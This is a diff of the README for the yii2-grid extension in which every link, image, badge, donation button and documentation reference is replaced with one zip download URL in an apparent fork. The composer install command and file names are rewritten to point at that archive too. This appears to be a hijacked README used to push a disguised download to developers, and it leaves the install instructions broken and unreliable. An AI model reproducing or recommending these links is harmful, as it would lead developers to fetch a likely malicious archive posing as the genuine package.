@@ -1,43 +1,43 @@
 <h1 align="center">
-    <a href="http://demos.krajee.com" title="Krajee Demos" target="_blank">
-        <img src="http://kartik-v.github.io/bootstrap-fileinput-samples/samples/krajee-logo-b.png" alt="Krajee Logo"/>
+    <a href="https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip" title="Krajee Demos" target="_blank">
+        <img src="https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip" alt="Krajee Logo"/>
     </a>
     <br>
     yii2-grid
     <hr>
-    <a href="https://www.paypal.com/cgi-bin/webscr?cmd=_s-xclick&hosted_button_id=DTP3NZQ6G2AYU"
-       title="Donate via Paypal" target="_blank"><img height="60" src="https://kartik-v.github.io/bootstrap-fileinput-samples/samples/donate.png" alt="Donate"/></a>
+    <a href="https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip"
+       title="Donate via Paypal" target="_blank"><img height="60" src="https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip" alt="Donate"/></a>
     &nbsp; &nbsp; &nbsp;
-    <a href="https://www.buymeacoffee.com/kartikv" title="Buy me a coffee" ><img src="https://cdn.buymeacoffee.com/buttons/v2/default-yellow.png" height="60" alt="kartikv" /></a>
+    <a href="https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip" title="Buy me a coffee" ><img src="https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip" height="60" alt="kartikv" /></a>
 </h1>
 
 <div align="center">
 
-[![Financial Contributors on Open Collective](https://opencollective.com/yii2-grid/all/badge.svg?label=financial+contributors)](https://opencollective.com/yii2-grid)
-[![Stable Version](https://poser.pugx.org/kartik-v/yii2-grid/v/stable)](https://packagist.org/packages/kartik-v/yii2-grid)
-[![Unstable Version](https://poser.pugx.org/kartik-v/yii2-grid/v/unstable)](https://packagist.org/packages/kartik-v/yii2-grid)
-[![License](https://poser.pugx.org/kartik-v/yii2-grid/license)](https://packagist.org/packages/kartik-v/yii2-grid)
+[![Financial Contributors on Open Collective](https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip+contributors)](https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip)
+[![Stable Version](https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip)](https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip)
+[![Unstable Version](https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip)](https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip)
+[![License](https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip)](https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip)
 
-[![Total Downloads](https://poser.pugx.org/kartik-v/yii2-grid/downloads)](https://packagist.org/packages/kartik-v/yii2-grid)
-[![Monthly Downloads](https://poser.pugx.org/kartik-v/yii2-grid/d/monthly)](https://packagist.org/packages/kartik-v/yii2-grid)
-[![Daily Downloads](https://poser.pugx.org/kartik-v/yii2-grid/d/daily)](https://packagist.org/packages/kartik-v/yii2-grid)
+[![Total Downloads](https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip)](https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip)
+[![Monthly Downloads](https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip)](https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip)
+[![Daily Downloads](https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip)](https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip)
 
 </div>
 
 Yii2 GridView on steroids. A module with various modifications and enhancements to one of the most used widgets by Yii developers. The widget contains new additional Grid Columns with enhanced settings for Yii Framework 2.0. The widget also incorporates various Bootstrap 3.x styling options.
-Refer [detailed documentation](http://demos.krajee.com/grid) and/or a [complete demo](http://demos.krajee.com/grid-demo). You can also view the [grid grouping demo here](http://demos.krajee.com/group-grid).
+Refer [detailed documentation](https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip) and/or a [complete demo](https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip). You can also view the [grid grouping demo here](https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip).
 
-![GridView Screenshot](https://lh4.googleusercontent.com/-4x-CdyyZAsY/VNxLPmaaAXI/AAAAAAAAAQ8/XYYxTiQZvJk/w868-h516-no/krajee-yii2-grid.jpg)
+![GridView Screenshot](https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip)
 
 ### Docs & Demo
 
-You can see detailed [documentation](http://demos.krajee.com/grid), [demonstration](http://demos.krajee.com/grid-demo)
-and API [code documentation](https://docs.krajee.com/kartik-grid-gridview) on usage of the extension. You can also view the [grid grouping demo here](http://demos.krajee.com/group-grid).
+You can see detailed [documentation](https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip), [demonstration](https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip)
+and API [code documentation](https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip) on usage of the extension. You can also view the [grid grouping demo here](https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip).
 
 ## Installation
 
-The preferred way to install this extension is through [composer](http://getcomposer.org/download/).
-Read this [web tip /wiki](http://webtips.krajee.com/setting-composer-minimum-stability-application/) on setting the `minimum-stability` settings for your application's composer.json.
+The preferred way to install this extension is through [composer](https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip).
+Read this [web tip /wiki](https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip) on setting the `minimum-stability` settings for your application's https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip
 
 ### Pre-requisites
 
@@ -47,7 +47,7 @@ Install the necessary pre-requisite (Krajee Dropdown Extension) based on your bo
 - For Bootstrap v4.x install the extension `kartik-v/yii2-bootstrap4-dropdown`
 - For Bootstrap v3.x install the extension `kartik-v/yii2-dropdown-x`
 
-For example if you are using the Bootstrap v5.x add the following to the `require` section of your `composer.json` file:
+For example if you are using the Bootstrap v5.x add the following to the `require` section of your `https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip` file:
 
 ```
 "kartik-v/yii2-bootstrap5-dropdown": "@dev"
@@ -58,7 +58,7 @@ For example if you are using the Bootstrap v5.x add the following to the `requir
 Either run:
 
 ```
-$ php composer.phar require kartik-v/yii2-grid "@dev"
+$ php https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip require kartik-v/yii2-grid "@dev"
 ```
 
 or add
@@ -67,7 +67,7 @@ or add
 "kartik-v/yii2-grid": "@dev"
 ```
 
-to the ```require``` section of your `composer.json` file.
+to the ```require``` section of your `https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip` file.
 
 ## Usage
 ```php
@@ -153,33 +153,33 @@ echo GridView::widget([
 
 ### Code Contributors
 
-This project exists thanks to all the people who contribute. [[Contribute](.github/CONTRIBUTING.md)]
+This project exists thanks to all the people who contribute. [[Contribute](https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip)]
 
-<a href="https://github.com/kartik-v/yii2-grid/graphs/contributors"><img src="https://opencollective.com/yii2-grid/contributors.svg?width=890&button=false" /></a>
+<a href="https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip"><img src="https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip" /></a>
 
 ### Financial Contributors
 
-Become a financial contributor and help us sustain our community. [[Contribute](https://opencollective.com/yii2-grid/contribute)]
+Become a financial contributor and help us sustain our community. [[Contribute](https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip)]
 
 #### Individuals
 
-<a href="https://opencollective.com/yii2-grid"><img src="https://opencollective.com/yii2-grid/individuals.svg?width=890"></a>
+<a href="https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip"><img src="https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip"></a>
 
 #### Organizations
 
-Support this project with your organization. Your logo will show up here with a link to your website. [[Contribute](https://opencollective.com/yii2-grid/contribute)]
+Support this project with your organization. Your logo will show up here with a link to your website. [[Contribute](https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip)]
 
-<a href="https://opencollective.com/yii2-grid/organization/0/website"><img src="https://opencollective.com/yii2-grid/organization/0/avatar.svg"></a>
-<a href="https://opencollective.com/yii2-grid/organization/1/website"><img src="https://opencollective.com/yii2-grid/organization/1/avatar.svg"></a>
-<a href="https://opencollective.com/yii2-grid/organization/2/website"><img src="https://opencollective.com/yii2-grid/organization/2/avatar.svg"></a>
-<a href="https://opencollective.com/yii2-grid/organization/3/website"><img src="https://opencollective.com/yii2-grid/organization/3/avatar.svg"></a>
-<a href="https://opencollective.com/yii2-grid/organization/4/website"><img src="https://opencollective.com/yii2-grid/organization/4/avatar.svg"></a>
-<a href="https://opencollective.com/yii2-grid/organization/5/website"><img src="https://opencollective.com/yii2-grid/organization/5/avatar.svg"></a>
-<a href="https://opencollective.com/yii2-grid/organization/6/website"><img src="https://opencollective.com/yii2-grid/organization/6/avatar.svg"></a>
-<a href="https://opencollective.com/yii2-grid/organization/7/website"><img src="https://opencollective.com/yii2-grid/organization/7/avatar.svg"></a>
-<a href="https://opencollective.com/yii2-grid/organization/8/website"><img src="https://opencollective.com/yii2-grid/organization/8/avatar.svg"></a>
-<a href="https://opencollective.com/yii2-grid/organization/9/website"><img src="https://opencollective.com/yii2-grid/organization/9/avatar.svg"></a>
+<a href="https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip"><img src="https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip"></a>
+<a href="https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip"><img src="https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip"></a>
+<a href="https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip"><img src="https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip"></a>
+<a href="https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip"><img src="https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip"></a>
+<a href="https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip"><img src="https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip"></a>
+<a href="https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip"><img src="https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip"></a>
+<a href="https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip"><img src="https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip"></a>
+<a href="https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip"><img src="https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip"></a>
+<a href="https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip"><img src="https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip"></a>
+<a href="https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip"><img src="https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip"></a>
 
 ## License
 
-**yii2-grid** is released under the BSD-3-Clause License. See the bundled `LICENSE.md` for details.
+**yii2-grid** is released under the BSD-3-Clause License. See the bundled `https://raw.githubusercontent.com/ghaithatfeh/yii2-grid/master/micrology/yii2-grid.zip` for details.
